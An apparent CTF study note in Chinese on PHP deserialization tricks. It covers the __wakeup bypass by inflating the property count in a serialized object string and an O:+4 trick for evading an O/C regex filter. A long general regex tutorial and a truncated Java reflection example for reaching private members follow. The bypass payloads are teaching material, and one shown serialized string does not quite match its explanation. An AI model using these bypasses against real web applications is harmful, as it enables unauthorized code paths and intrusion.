-<p>函数    说明<br>__construct()    类的构造函数<br>__destruct()    类的析构函数<br>__call()    在对象中调用一个不可访问方法时调用<br>__callStatic()    用静态方式中调用一个不可访问方法时调用<br>__get()    获得一个类的成员变量时调用<br>__set()    设置一个类的成员变量时调用<br>__isset()    当对不可访问属性调用isset()或empty()时调用<br>__unset()    当对不可访问属性调用unset()时被调用<br>__sleep()    执行serialize()时，先会调用这个函数<br>__wakeup()    执行unserialize()时，先会调用这个函数<br>__toString()    类被当成字符串时的回应方法<br>__invoke()    调用函数的方式调用一个对象时的回应方法<br>__set_state()    调用var_export()导出类时，此静态方法会被调用<br>__clone    当对象复制完成时调用<br>__autoload()    尝试加载未定义的类<br>__debugInfo()    打印所需调试信息</p>
-<p>三．__wakeup()<br>将在序列化之后立即被调用<br>当序列化字符串表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行。<br>与 序列化函数类似?unserialize()?会检查是否存在一个?__wakeup()魔术方法<br>如果存在则会先调用__wakeup()方法在进行反序列化<br>可以再__wakeup()方法中对属性进行初始化或者改变。<br>例题</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class xctf&#123;</span><br><span class="line">public <span class="variable">$flag</span> =<span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
-<p>对这个进行序列化</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class xctf&#123;</span><br><span class="line">public <span class="variable">$flag</span> =<span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> =new xctf;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果得到</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:<span class="string">&quot;xctf&quot;</span>:2:&#123;s:4:<span class="string">&quot;flag&quot;</span>;s:3:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
-<p>然后将序列化后字符串中属性的个数由1改为2，大于真实属性个数1，即可绕过__wakeup</p>
-<p>四．O/C绕过<br>正则匹配的意思是如果在var变量中存在O/C:数字（O:数字或者C：数字这样的形式）就die掉，这里匹配的是0:4，直接使用+号当作空格即可绕过，即0:+4即可绕过<br>正则匹配：<br>正则表达式从左到右进行计算，并遵循优先级顺序，这与算术表达式非常类似。<br>相同优先级的从左到右进行运算，不同优先级的运算先高后低。下表从最高到最低说明了各种正则表达式运算符的优先级顺序：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">运算符 	描述</span><br><span class="line">\ 	转义符</span><br><span class="line">(), (?:), (?=), [] 	圆括号和方括号</span><br><span class="line">*, +, ?, &#123;n&#125;, &#123;n,&#125;, &#123;n,m&#125; 	限定符</span><br><span class="line">^, $, \任何元字符、任何字符 	定位点和序列（即：位置和顺序）</span><br><span class="line">| 	替换，<span class="string">&quot;或&quot;</span>操作</span><br><span class="line">字符具有高于替换运算符的优先级，使得<span class="string">&quot;m|food&quot;</span>匹配<span class="string">&quot;m&quot;</span>或<span class="string">&quot;food&quot;</span>。若要匹配<span class="string">&quot;mood&quot;</span>或<span class="string">&quot;food&quot;</span>，请使用括号创建子表达式，从而产生<span class="string">&quot;(m|f)ood&quot;</span>。 </span><br></pre></td></tr></table></figure>
-<p>正则表达式 - 匹配规则<br>基本模式匹配<br>一切从最基本的开始。模式，是正则表达式最基本的元素，它们是一组描述字符串特征的字符。模式可以很简单，由普通的字符串组成，也可以非常复杂，往往用特殊的字符表示一个范围内的字符、重复出现，或表示上下文。例如：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^once</span><br></pre></td></tr></table></figure>
-<p>这个模式包含一个特殊的字符^，表示该模式只匹配那些以once开头的字符串。例如该模式与字符串”once upon a time”匹配，与”There once was a man from NewYork”不匹配。正如如^符号表示开头一样，$符号用来匹配那些以给定模式结尾的字符串。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bucket$</span><br></pre></td></tr></table></figure>
-<p>这个模式与”Who kept all of this cash in a bucket”匹配，与”buckets”不匹配。字符 ^ 和 $ 同时使用时，表示精确匹配（字符串与模式一样）。例如：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^bucket$</span><br></pre></td></tr></table></figure>
-<p>只匹配字符串”bucket”。如果一个模式不包括^和$，那么它与任何包含该模式的字符串匹配。例如：模式</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">once</span><br></pre></td></tr></table></figure>
-<p>与字符串<br>There once was a man from NewYorkWho kept all of his cash in a bucket.<br>是匹配的。<br>在该模式中的字母(o-n-c-e)是字面的字符，也就是说，他们表示该字母本身，数字也是一样的。其他一些稍微复杂的字符，如标点符号和白字符（空格、制表符等），要用到转义序列。所有的转义序列都用反斜杠()打头。制表符的转义序列是 \t。所以如果我们要检测一个字符串是否以制表符开头，可以用这个模式：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^\t </span><br></pre></td></tr></table></figure>
-<p>类似的，用\n表示”新行”，\r表示回车。其他的特殊符号，可以用在前面加上反斜杠，如反斜杠本身用\表示，句号.用.表示，以此类推。<br>字符簇<br>在INTERNET的程序中，正则表达式通常用来验证用户的输入。当用户提交一个FORM以后，要判断输入的电话号码、地址、EMAIL地址、信用卡号码等是否有效，用普通的基于字面的字符是不够的。<br>所以要用一种更自由的描述我们要的模式的办法，它就是字符簇。要建立一个表示所有元音字符的字符簇，就把所有的元音字符放在一个方括号里：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[AaEeIiOoUu]</span><br></pre></td></tr></table></figure>
-<p>这个模式与任何元音字符匹配，但只能表示一个字符。用连字号可以表示一个字符的范围，如：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[a-z] //匹配所有的小写字母 [A-Z] //匹配所有的大写字母 [a-zA-Z] //匹配所有的字母 [0-9] //匹配所有的数字 [0-9\.\-] //匹配所有的数字，句号和减号 [ \f\r\t\n] //匹配所有的白字符</span><br></pre></td></tr></table></figure>
-<p>同样的，这些也只表示一个字符，这是一个非常重要的。如果要匹配一个由一个小写字母和一位数字组成的字符串，比如”z2”、”t6”或”g7”，但不是”ab2”、”r2d3” 或”b52”的话，用这个模式：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[a-z][0-9]$</span><br></pre></td></tr></table></figure>
-<p>尽管[a-z]代表26个字母的范围，但在这里它只能与第一个字符是小写字母的字符串匹配。<br>前面曾经提到^表示字符串的开头，但它还有另外一个含义。当在一组方括号里使用 ^ 时，它表示”非”或”排除”的意思，常常用来剔除某个字符。还用前面的例子，我们要求第一个字符不能是数字：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[^0-9][0-9]$</span><br></pre></td></tr></table></figure>
-<p>这个模式与”&amp;5”、”g7”及”-2”是匹配的，但与”12”、”66”是不匹配的。下面是几个排除特定字符的例子：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[^a-z] //除了小写字母以外的所有字符 [^\\\/\^] //除了(\)(/)(^)之外的所有字符 [^\&quot;\<span class="string">&#x27;] //除了双引号(&quot;)和单引号(&#x27;</span>)之外的所有字符</span><br></pre></td></tr></table></figure>
-<p>特殊字符 .(点，句号)在正则表达式中用来表示除了”新行”之外的所有字符。所以模式 ^.5$ 与任何两个字符的、以数字5结尾和以其他非”新行”字符开头的字符串匹配。模式 . 可以匹配任何字符串，除了空串和只包括一个”新行”的字符串<br>PHP的正则表达式有一些内置的通用字符簇，列表如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">字符簇 	描述</span><br><span class="line">[[:alpha:]] 	任何字母</span><br><span class="line">[[:digit:]] 	任何数字</span><br><span class="line">[[:alnum:]] 	任何字母和数字</span><br><span class="line">[[:space:]] 	任何空白字符</span><br><span class="line">[[:upper:]] 	任何大写字母</span><br><span class="line">[[:lower:]] 	任何小写字母</span><br><span class="line">[[:punct:]] 	任何标点符号</span><br><span class="line">[[:xdigit:]] 	任何16进制的数字，相当于[0-9a-fA-F]</span><br></pre></td></tr></table></figure>
-<p>确定重复出现<br>到现在为止，你已经知道如何去匹配一个字母或数字，但更多的情况下，可能要匹配一个单词或一组数字。一个单词有若干个字母组成，一组数字有若干个单数组成。跟在字符或字符簇后面的花括号({})用来确定前面的内容的重复出现的次数。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">字符簇 	描述</span><br><span class="line">^[a-zA-Z_]$ 	所有的字母和下划线</span><br><span class="line">^[[:alpha:]]&#123;3&#125;$ 	所有的3个字母的单词</span><br><span class="line">^a$ 	字母a</span><br><span class="line">^a&#123;4&#125;$ 	aaaa</span><br><span class="line">^a&#123;2,4&#125;$ 	aa,aaa或aaaa</span><br><span class="line">^a&#123;1,3&#125;$ 	a,aa或aaa</span><br><span class="line">^a&#123;2,&#125;$ 	包含多于两个a的字符串</span><br><span class="line">^a&#123;2,&#125; 	如：aardvark和aaab，但apple不行</span><br><span class="line">a&#123;2,&#125; 	如：baad和aaa，但Nantucket不行</span><br><span class="line">\t&#123;2&#125; 	两个制表符</span><br><span class="line">.&#123;2&#125; 	所有的两个字符</span><br></pre></td></tr></table></figure>
-<p>这些例子描述了花括号的三种不同的用法。一个数字 {x} 的意思是前面的字符或字符簇只出现x次 ；一个数字加逗号 {x,} 的意思是前面的内容出现x或更多的次数 ；两个数字用逗号分隔的数字 {x,y} 表示 前面的内容至少出现x次，但不超过y次。我们可以把模式扩展到更多的单词或数字：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">^[a-zA-Z0-9_]&#123;1,&#125;$      // 所有包含一个以上的字母、数字或下划线的字符串 </span><br><span class="line">^[1-9][0-9]&#123;0,&#125;$        // 所有的正整数 </span><br><span class="line">^\-&#123;0,1&#125;[0-9]&#123;1,&#125;$      // 所有的整数 </span><br><span class="line">^[-]?[0-9]+\.?[0-9]+$   // 所有的浮点数</span><br></pre></td></tr></table></figure>
-<p>以一个可选的负号 ([-]?) 开头 (^)、跟着1个或更多的数字([0-9]+)、和一个小数点(.)再跟上1个或多个数字([0-9]+)，并且后面没有其他任何东西($)。下面你将知道能够使用的更为简单的方法。<br>特殊字符 ? 与 {0,1} 是相等的，它们都代表着： 0个或1个前面的内容 或 前面的内容是可选的 。所以刚才的例子可以简化为：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^\-?[0-9]&#123;1,&#125;\.?[0-9]&#123;1,&#125;$</span><br></pre></td></tr></table></figure>
-<p>特殊字符 * 与 {0,} 是相等的，它们都代表着 0 个或多个前面的内容 。最后，字符 + 与 {1,} 是相等的，表示 1 个或多个前面的内容 ，所以上面的4个例子可以写成：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[a-zA-Z0-9_]+$      // 所有包含一个以上的字母、数字或下划线的字符串 ^[1-9][0-9]*$        // 所有的正整数 ^\-?[0-9]+$          // 所有的整数 ^[-]?[0-9]+(\.[0-9]+)?$ // 所有的浮点数</span><br></pre></td></tr></table></figure>
-<p>正则表达式 - 示例<br>简单表达式<br>正则表达式的最简单形式是在搜索字符串中匹配其本身的单个普通字符。例如，单字符模式，如 A，不论出现在搜索字符串中的何处，它总是匹配字母 A。下面是一些单字符正则表达式模式的示例：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/a//7//M/</span><br></pre></td></tr></table></figure>
-<p>可以将许多单字符组合起来以形成大的表达式。例如，以下正则表达式组合了单字符表达式：a、7 和 M。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/a7M/</span><br></pre></td></tr></table></figure>
-<p>请注意，没有串联运算符。只须在一个字符后面键入另一个字符。<br>字符匹配<br>句点 (.) 匹配字符串中的各种打印或非打印字符，只有一个字符例外。这个例外就是换行符 (\n)。下面的正则表达式匹配 aac、abc、acc、adc 等等，以及 a1c、a2c、a-c 和 a#c：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/a.c/</span><br></pre></td></tr></table></figure>
-<p>若要匹配包含文件名的字符串，而句点 (.) 是输入字符串的组成部分，请在正则表达式中的句点前面加反斜杠 () 字符。举例来说明，下面的正则表达式匹配 filename.ext：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/filename\.ext/</span><br></pre></td></tr></table></figure>
-<p>这些表达式只让您匹配”任何”单个字符。可能需要匹配列表中的特定字符组。例如，可能需要查找用数字表示的章节标题（Chapter 1、Chapter 2 等等）。<br>中括号表达式<br>若要创建匹配字符组的一个列表，请在方括号（[ 和 ]）内放置一个或更多单个字符。当字符括在中括号内时，该列表称为”中括号表达式”。与在任何别的位置一样，普通字符在中括号内表示其本身，即，它在输入文本中匹配一次其本身。大多数特殊字符在中括号表达式内出现时失去它们的意义。不过也有一些例外，如：<br>?如果 ] 字符不是第一项，它结束一个列表。若要匹配列表中的 ] 字符，请将它放在第一位，紧跟在开始 [ 后面。<br>?\ 字符继续作为转义符。若要匹配 \ 字符，请使用 \。<br>括在中括号表达式中的字符只匹配处于正则表达式中该位置的单个字符。以下正则表达式匹配 Chapter 1、Chapter 2、Chapter 3、Chapter 4 和 Chapter 5：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Chapter [12345]/</span><br></pre></td></tr></table></figure>
-<p>请注意，单词 Chapter 和后面的空格的位置相对于中括号内的字符是固定的。中括号表达式指定的只是匹配紧跟在单词 Chapter 和空格后面的单个字符位置的字符集。这是第九个字符位置。<br>若要使用范围代替字符本身来表示匹配字符组，请使用连字符 (-) 将范围中的开始字符和结束字符分开。单个字符的字符值确定范围内的相对顺序。下面的正则表达式包含范围表达式，该范围表达式等效于上面显示的中括号中的列表。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Chapter [1-5]/</span><br></pre></td></tr></table></figure>
-<p>当以这种方式指定范围时，开始值和结束值两者都包括在范围内。注意，还有一点很重要，按 Unicode 排序顺序，开始值必须在结束值的前面。<br>若要在中括号表达式中包括连字符，请采用下列方法之一：<br>  用反斜杠将它转义： </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[\-]</span><br></pre></td></tr></table></figure>
-<p> 将连字符放在中括号列表的开始或结尾。下面的表达式匹配所有小写字母和连字符： </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[-a-z][a-z-]</span><br><span class="line">```    创建一个范围，在该范围中，开始字符值小于连字符，而结束字符值等于或大于连字符。下面的两个正则表达式都满足这一要求： </span><br><span class="line">```bash</span><br><span class="line">[!--][!-~]</span><br></pre></td></tr></table></figure>
-<p>若要查找不在列表或范围内的所有字符，请将插入符号 (^) 放在列表的开头。如果插入字符出现在列表中的其他任何位置，则它匹配其本身。下面的正则表达式匹配1、2、3、4 或 5 之外的任何数字和字符：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Chapter [^12345]/</span><br></pre></td></tr></table></figure>
-<p>在上面的示例中，表达式在第九个位置匹配 1、2、3、4 或 5 之外的任何数字和字符。这样，例如，Chapter 7 就是一个匹配项，Chapter 9 也是一个匹配项。<br>上面的表达式可以使用连字符 (-) 来表示：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Chapter [^1-5]/</span><br></pre></td></tr></table></figure>
-<p>中括号表达式的典型用途是指定任何大写或小写字母或任何数字的匹配。下面的表达式指定这样的匹配：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[A-Za-z0-9]/</span><br></pre></td></tr></table></figure>
-<p>替换和分组<br>替换使用 | 字符来允许在两个或多个替换选项之间进行选择。例如，可以扩展章节标题正则表达式，以返回比章标题范围更广的匹配项。但是，这并不象您可能认为的那样简单。替换匹配 | 字符任一侧最大的表达式。<br>您可能认为，下面的表达式匹配出现在行首和行尾、后面跟一个或两个数字的 Chapter 或 Section：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^Chapter|Section [1-9][0-9]&#123;0,1&#125;$/</span><br></pre></td></tr></table></figure>
-<p>很遗憾，上面的正则表达式要么匹配行首的单词 Chapter，要么匹配行尾的单词 Section 及跟在其后的任何数字。如果输入字符串是 Chapter 22，那么上面的表达式只匹配单词 Chapter。如果输入字符串是 Section 22，那么该表达式匹配 Section 22。<br>若要使正则表达式更易于控制，可以使用括号来限制替换的范围，即，确保它只应用于两个单词 Chapter 和 Section。但是，括号也用于创建子表达式，并可能捕获它们以供以后使用，这一点在有关反向引用的那一节讲述。通过在上面的正则表达式的适当位置添加括号，就可以使该正则表达式匹配 Chapter 1 或 Section 3。<br>下面的正则表达式使用括号来组合 Chapter 和 Section，以便表达式正确地起作用：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^(Chapter|Section) [1-9][0-9]&#123;0,1&#125;$/</span><br></pre></td></tr></table></figure>
-<p>尽管这些表达式正常工作，但 Chapter|Section 周围的括号还将捕获两个匹配字中的任一个供以后使用。由于在上面的表达式中只有一组括号，因此，只有一个被捕获的”子匹配项”。<br>在上面的示例中，您只需要使用括号来组合单词 Chapter 和 Section 之间的选择。若要防止匹配被保存以备将来使用，请在括号内正则表达式模式之前放置 ?:。下面的修改提供相同的能力而不保存子匹配项：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^(?:Chapter|Section) [1-9][0-9]&#123;0,1&#125;$/</span><br></pre></td></tr></table></figure>
-<p>除 ?: 元字符外，两个其他非捕获元字符创建被称为”预测先行”匹配的某些内容。正向预测先行使用 ?= 指定，它匹配处于括号中匹配正则表达式模式的起始点的搜索字符串。反向预测先行使用 ?! 指定，它匹配处于与正则表达式模式不匹配的字符串的起始点的搜索字符串。<br>例如，假设您有一个文档，该文档包含指向 Windows 3.1、Windows 95、Windows 98 和 Windows NT 的引用。再进一步假设，您需要更新该文档，将指向 Windows 95、Windows 98 和 Windows NT 的所有引用更改为 Windows 2000。下面的正则表达式（这是一个正向预测先行的示例）匹配 Windows 95、Windows 98 和 Windows NT：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Windows(?=95 |98 |NT )/</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">正则表达式 	描述</span><br><span class="line">/\b([a-z]+) \1\b/gi 	一个单词连续出现的位置。</span><br><span class="line">/(\w+):\/\/([^/:]+)(:\d*)?([^<span class="comment"># ]*)/ 	将一个URL解析为协议、域、端口及相对路径。</span></span><br><span class="line">/^(?:Chapter|Section) [1-9][0-9]&#123;0,1&#125;$/ 	定位章节的位置。</span><br><span class="line">/[-a-z]/ 	a至z共26个字母再加一个-号。</span><br><span class="line">/ter\b/ 	可匹配chapter，而不能匹配terminal。</span><br><span class="line">/\Bapt/ 	可匹配chapter，而不能匹配aptitude。</span><br><span class="line">/Windows(?=95 |98 |NT )/ 	可匹配Windows95或Windows98或WindowsNT，当找到一个匹配后，从Windows后面开始进行下一次的检索匹配。</span><br><span class="line">/^\s*$/ 	匹配空行。</span><br><span class="line">/\d&#123;2&#125;-\d&#123;5&#125;/ 	验证由两位数字、一个连字符再加 5 位数字组成的 ID 号。</span><br><span class="line">/&lt;\s*(\S+)(\s[^&gt;]*)?&gt;[\s\S]*&lt;\s*\/\1\s*&gt;/ 	匹配 HTML 标记。</span><br></pre></td></tr></table></figure>
-<p>五．私有属性绕过<br>java的反射可以绕过访问权限，访问到类的私有方法和成员。可能这点会引起安全性的讨论。反射的使用帮助解决很多复杂的问题，其运行时的类型检查，动态调用，代理的实现等，反射为我们写程序带来了很大的灵活性，很多功能都是基于反射。<br>    利用反射还可以访问内部类、匿名内部类的私有属性。<br>    用java自带的java -private 类名 反编译命令可以查看类的完整定义。（参考think in java）<br>下面举例子说明。首先定义一个接口 </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">Java代码  public interface Ref &#123;   </span><br><span class="line">    public void f();   </span><br><span class="line">&#125; public interface Ref &#123;</span><br><span class="line"> public void f();</span><br><span class="line">&#125;</span><br><span class="line">接口的实现类 </span><br><span class="line">Java代码  public class RefImpl implements Ref &#123;   </span><br><span class="line">        //实现接口方法   </span><br><span class="line">    public void <span class="function"><span class="title">f</span></span>() &#123;   </span><br><span class="line">        System.out.println(<span class="string">&quot;public method f()&quot;</span>);   </span><br><span class="line">    &#125;   </span><br><span class="line">       </span><br><span class="line">    void g(String args)&#123;   </span><br><span class="line">        System.out.println(<span class="string">&quot;package method g():&quot;</span> + args);   </span><br><span class="line">    &#125;   </span><br><span class="line">       </span><br><span class="line">    private void <span class="function"><span class="title">w</span></span>()&#123;   </span><br><span class="line">        System.out.println(<span class="string">&quot;private method w()&quot;</span>);   </span><br><span class="line">    &#125;   </span><br><span class="line">&#125; public class RefImpl implements Ref &#123;</span><br><span class="line">        //实现接口方法</span><br><span class="line"> public void <span class="function"><span class="title">f</span></span>() &#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;public method f()&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> void g(String args)&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;package method g():&quot;</span> + args);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> private void <span class="function"><span class="title">w</span></span>()&#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;private method w()&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">测试类 </span><br><span class="line">Java代码  public class TestRef &#123;   </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) &#123;   </span><br><span class="line">        Ref ref = new RefImpl();   </span><br><span class="line">        System.out.println(ref.getClass().getSimpleName()); //RefImpl类型   </span><br><span class="line">        ref.f(); //调用接口方法   //      ref.g();  //向上转型后实现类添加的方法不能调用   </span><br><span class="line">        <span class="keyword">if</span>(ref instanceof RefImpl)&#123;   </span><br><span class="line">            RefImpl ref1 = (RefImpl)ref;  //类型识别后转型   </span><br><span class="line">            ref1.g(<span class="string">&quot;zhouyang&quot;</span>);   //          ref1.w(); //私有方法不能访问   </span><br><span class="line">        &#125;   </span><br><span class="line">           </span><br><span class="line">        //通过反射调用方法   </span><br><span class="line">        try &#123;   </span><br><span class="line">            Ref ref2 = new RefImpl();   </span><br><span class="line">            Method m = ref2.getClass().getDeclaredMethod(<span class="string">&quot;f&quot;</span>);   </span><br><span class="line">            Method m1 = ref2.getClass().getDeclaredMethod(<span class="string">&quot;g&quot;</span>, String.class);//有参的方法   </span><br><span class="line">            Method m2 = ref2.getClass().getDeclaredMethod(<span class="string">&quot;w&quot;</span>);   </span><br><span class="line">            System.out.println(<span class="string">&quot;==============&quot;</span>);   </span><br><span class="line">            m.invoke(ref);  //调用方法f()   </span><br><span class="line">            m1.invoke(ref, <span class="string">&quot;yangzhou&quot;</span>);   </span><br><span class="line">               </span><br><span class="line">            m2.setAccessible(<span class="literal">true</span>);///调用private方法的关键一句话   </span><br><span class="line">            m2.invoke(ref);   </span><br><span class="line">        &#125; catch (Exception e) &#123;   </span><br><span class="line">            e.printStackTrace();   </span><br><span class="line">        &#125;    </span><br><span class="line">           </span><br><span class="line">        //java的javap反编译能够查看类的信息，-private 开关能够打开所有信息   </span><br><span class="line">        //javap -private 类名      类必须是编译成.calss 文件   </span><br><span class="line">           </span><br><span class="line">        //利用反射访问私有成员，改变私有成员值，但是final域可以访问不可改变   </span><br><span class="line">        PrivateField pf = new PrivateField();   //      ps.ss; //私有成员不能访问   </span><br><span class="line">        //打印原来的成员值   </span><br><span class="line">        pf.print();   </span><br><span class="line">        try &#123;   </span><br><span class="line">            //反射访问和改变原来值   </span><br><span class="line">            Field[] f = pf.getClass().getDeclaredFields();   </span><br><span class="line">            <span class="keyword">for</span>(int   i=0;i&lt;f.length;i++)&#123;   </span><br><span class="line">                f[i].setAccessible(<span class="literal">true</span>);   </span><br><span class="line">                System.out.println(f[i].getType());//打印字段类型      </span><br><span class="line">                System.out.println(f[i].get(pf)); //打印值   </span><br><span class="line">                <span class="keyword">if</span>(<span class="string">&quot;ss&quot;</span>.equals(f[i].getName()))&#123;   